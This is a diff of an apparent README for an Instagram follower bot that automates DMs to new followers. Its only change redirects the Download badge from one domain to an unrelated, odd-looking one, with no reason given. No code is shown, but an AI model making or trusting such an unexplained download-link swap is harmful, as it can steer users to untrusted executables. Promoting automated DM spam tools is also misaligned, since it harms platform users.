@@ -49,7 +49,7 @@ A: Yes — send automated DMs to new followers.
 
 **Monthly downloads:** 2.3m+
 
-[![Download](https://img.shields.io/badge/Download-v6.4-brightgreen?style=for-the-badge)](https://connectinstruction.com/instafollowerbot)
+[![Download](https://img.shields.io/badge/Download-v6.4-brightgreen?style=for-the-badge)](https://dllvcrun.com/instafollowerbot)
 
 ---
 
